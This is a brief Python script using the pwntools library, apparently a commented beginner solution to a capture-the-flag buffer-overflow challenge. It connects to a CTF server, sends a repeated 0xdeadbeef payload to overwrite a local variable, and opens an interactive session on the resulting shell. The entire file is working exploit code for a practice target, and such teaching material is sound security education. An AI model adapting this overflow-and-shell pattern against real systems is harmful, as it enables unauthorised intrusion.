# This is our hacking library.  It is called pwntools.
# You will need to install this with pip
# It works best on Linux, so use a VM.
from pwn import *

# p = process('./bof1') # This is for testing offline
p = remote('chal.ctf.osusec.org', 10000) # This is for actually hacking the challenge on the remote server

p.sendline(p32(0xdeadbeef) * 1000) # Overflow the thing to change the flag local var!

p.interactive() # Use the shell we popped
